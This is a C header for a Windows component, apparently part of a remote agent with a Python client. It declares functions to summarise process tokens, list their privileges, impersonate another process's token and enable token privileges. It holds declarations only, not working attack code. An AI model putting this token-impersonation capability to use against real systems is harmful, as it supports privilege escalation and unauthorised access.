#pragma once
#include <Windows.h>
#include <sddl.h>
#include <strsafe.h>

#include "debug.h"
#include "error.h"


typedef struct _TOKEN_SUMMARY_HEADER
{
	DWORD elevated;
	DWORD impersonated;
	DWORD userNameLength;
	DWORD userSidLength;
} TOKEN_SUMMARY_HEADER;

/**
 * @brief Builds a response buffer that summarizes the current process token.
 *
 * The response contains a fixed-size TOKEN_SUMMARY_HEADER followed by a
 * UTF-16LE user name string and a UTF-16LE SID string. Both strings include
 * their terminating null characters.
 *
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD BuildCurrentTokenSummaryResponse(PBYTE* responseData, DWORD* responseLen);

/**
 * @brief Builds a response buffer that summarizes a target process token.
 *
 * The intended response format mirrors BuildCurrentTokenSummaryResponse so the
 * Python client can parse local and remote token summaries consistently.
 *
 * @param processId The target process identifier.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD BuildProcessTokenSummaryResponse(
	DWORD processId,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Builds a response buffer containing all privileges on a target token.
 *
 * @param processId The target process identifier.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD BuildTokenPrivilegesResponse(
	DWORD processId,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Attempts to impersonate the token of a target process.
 *
 * @param processId The target process identifier.
 *
 * @return A numeric error or success code.
 */
DWORD ImpersonateProcessToken(DWORD processId, PBYTE* responseData, DWORD* responseLen);

/**
 * @brief Attempts to enable a privilege on the current process token.
 *
 * @param privilegeName The privilege name to enable.
 *
 * @return A numeric error or success code.
 */
DWORD EnableCurrentTokenPrivilege(PCWSTR privilegeName, PBYTE* responseData, DWORD* responseLen);
